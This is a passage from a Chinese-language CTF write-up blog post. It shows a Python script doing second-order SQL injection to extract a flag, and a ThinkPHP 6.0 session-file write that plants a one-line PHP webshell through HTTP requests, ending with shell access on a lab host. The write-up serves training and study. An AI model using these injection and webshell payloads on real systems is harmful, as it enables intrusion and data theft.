class="built_in">str</span>(i)&#125;</span> for 10)+&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data1=&#123;</span><br><span class="line">            <span class="string">&quot;email&quot;</span>:<span class="string">f&quot;<span class="subst">&#123;j&#125;</span>&quot;</span>+<span class="string">&quot;@qq.com&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;&#x27;+substr(hex(hex((select * from flag)))from <span class="subst">&#123;(i-<span class="number">1</span>)*<span class="number">10</span>+<span class="number">1</span>&#125;</span> for 10)+&#x27;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    data2=&#123;</span><br><span class="line">        <span class="string">&quot;email&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;j&#125;</span>&quot;</span>+<span class="string">&quot;@qq.com&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r1=requests.post(url=url1,data=data1)</span><br><span class="line">    r2=requests.post(url=url2,data=data2)</span><br><span class="line">    <span class="comment"># print(data1[&quot;email&quot;])</span></span><br><span class="line">    <span class="comment"># print(r1.text)</span></span><br><span class="line">    <span class="built_in">str</span>=r2.text</span><br><span class="line">    <span class="comment"># print(str)</span></span><br><span class="line">    <span class="comment"># print(str.find(&#x27;36&#x27;))</span></span><br><span class="line">    <span class="comment"># print(str[837:847])</span></span><br><span class="line">    res+=<span class="built_in">str</span>[<span class="number">837</span>:<span class="number">847</span>]</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    <span class="comment"># print(res[-10:-1])</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终也是可以跑出来答案，把结果hex解密2次即可：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669268045640-4f90651c-539d-4737-a54c-b746812e0b99.png#averageHue=%23fbfbfa&clientId=u7e8b7983-b86f-4&from=paste&height=536&id=u8ac31763&name=image.png&originHeight=670&originWidth=1692&originalType=binary&ratio=1&rotation=0&showTitle=false&size=67161&status=done&style=none&taskId=u9435eac1-f9a5-4943-a1f0-c2d2dd2c091&title=&width=1353.6" alt="image.png"></p>
<h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>考点：THinkphp6.0文件写入CVE<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669355966963-e46dbc71-a213-483b-a38a-05d60096a9fa.png#averageHue=%23fefefe&clientId=u14d9fba1-5b10-4&from=paste&height=516&id=u65da8df3&name=image.png&originHeight=645&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35742&status=done&style=none&taskId=ua96c6ae3-fb61-489b-b4b7-9e48849da0b&title=&width=1536" alt="image.png"><br>朴实无华的一个web界面，扫描目录发现<code>www.zip</code>备份文件：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669356025280-4326bf4c-6c01-463c-956d-dc5ce2cbabb0.png#averageHue=%23e4c289&clientId=u14d9fba1-5b10-4&from=paste&height=677&id=u3cf0658d&name=image.png&originHeight=846&originWidth=1399&originalType=binary&ratio=1&rotation=0&showTitle=false&size=185632&status=done&style=none&taskId=u6489e01b-1163-4e53-8d88-5a3d318e7b0&title=&width=1119.2" alt="image.png"><br>鉴定为TP6.0，查阅有关资料发现存在<code>任意文件操纵漏洞</code><br>具体分析请参考我的专题<code>ThinkPHP CVE</code><br>这里就直接上我的请求包<br>注册一个账号，登录时抓包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /home/member/login HTTP/1.1</span><br><span class="line">Host: 405e82e2-7362-4608-aed1-0a07ec2465bb.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 30</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://405e82e2-7362-4608-aed1-0a07ec2465bb.node4.buuoj.cn:81</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://405e82e2-7362-4608-aed1-0a07ec2465bb.node4.buuoj.cn:81/home/member/login</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: PHPSESSID=bbbbbbbbbbbbbbbbbbbbbbbbbbbb.php</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=Boogipop&amp;password=123</span><br></pre></td></tr></table></figure>
<p>将PHPSESSID改为同样为32位的一个php文件名称，然后登录，在搜索界面抓包改包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /home/member/search HTTP/1.1</span><br><span class="line">Host: 405e82e2-7362-4608-aed1-0a07ec2465bb.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 5</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://405e82e2-7362-4608-aed1-0a07ec2465bb.node4.buuoj.cn:81</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://405e82e2-7362-4608-aed1-0a07ec2465bb.node4.buuoj.cn:81/home/member/search</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: PHPSESSID=bbbbbbbbbbbbbbbbbbbbbbbbbbbb.php</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">key=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
<p>同样改包发送，这里的key就是我们一句话木马的内容：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669356389226-788714a0-1afc-4178-af44-1f4104dcd2cc.png#averageHue=%23ebd1a0&clientId=u14d9fba1-5b10-4&from=paste&height=119&id=u6d6cfbad&name=image.png&originHeight=149&originWidth=1453&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15048&status=done&style=none&taskId=u00e19066-f96d-40c5-897a-624b493ed5d&title=&width=1162.4" alt="image.png"><br>访问<code>/runtime/session/sess_bbbbbbbbbbbbbbbbbbbbbbbbbbbb.php</code><br>即可getshell，在phpinfo界面发现有disabled_function限制，这里用蚁剑自带的UAF去绕过即可，最后再根目录：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1669356439108-af601a46-9bef-4f77-943f-c7071d18ba5b.png#averageHue=%230e0e0e&clientId=u14d9fba1-5b10-4&from=paste&height=298&id=ubf3d20c8&name=image.png&originHeight=372&originWidth=773&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35990&status=done&style=none&taskId=u831ae215-3e99-4e02-8503-c739abe3f14&title=&width=618.4" alt="image.png"><br>可以看见flag没有读的权限，但是有个readflag，运行即可获得flag</p>
<p>第三页结束啦！</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/BUUCTF/" class="tag">#BUUCTF</a><a href="/tags/刷题记录/" class="tag">#刷题记录</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/04/09/%E5%AE%89%E6%9C%8D%E4%BB%94%E7%9A%84%E5%85%A5%E8%81%8C%E5%B0%8F%E8%AE%B0/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">安服仔的入职小记</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/04/08/BUUCTF4/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">BUUCTF Web Writeup 4</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2025 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>